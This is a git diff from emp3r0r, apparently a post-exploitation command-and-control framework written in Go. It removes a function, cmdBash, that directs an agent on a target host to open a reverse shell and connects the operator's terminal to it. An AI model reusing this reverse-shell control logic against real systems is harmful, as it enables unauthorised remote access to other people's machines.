@@ -1,10 +1,6 @@
 package cc
 
 import (
-	"fmt"
-	"time"
-
-	"github.com/google/uuid"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 )
 
@@ -81,35 +77,4 @@ func moduleShell() {
 	if err != nil {
 		CliPrintError("moduleShell: %v", err)
 	}
-}
-
-func cmdBash() (err error) {
-	// activate reverse shell in agent
-	token := uuid.New().String()
-	RShellStream.Token = token
-	cmd := fmt.Sprintf("bash %s", token)
-	err = SendCmd(cmd, CurrentTarget)
-	if err != nil {
-		CliPrintError("Cannot activate reverse shell on remote target: %v", err)
-		return
-	}
-
-	// wait for agent to send shell
-	for {
-		if RShellStatus[token] != nil {
-			CliPrintError("\n[-] An error occured: %v\n", RShellStatus[token])
-			return RShellStatus[token]
-		}
-		if RShellStream.H2x.Ctx != nil && RShellStream.H2x.Conn != nil {
-			break
-		}
-		time.Sleep(200 * time.Millisecond)
-	}
-
-	// set up local terminal to use remote bash shell
-	send := make(chan []byte)
-	reverseBash(RShellStream.H2x.Ctx, send, RShellStream.Buf)
-	time.Sleep(1 * time.Second)
-
-	return
 }
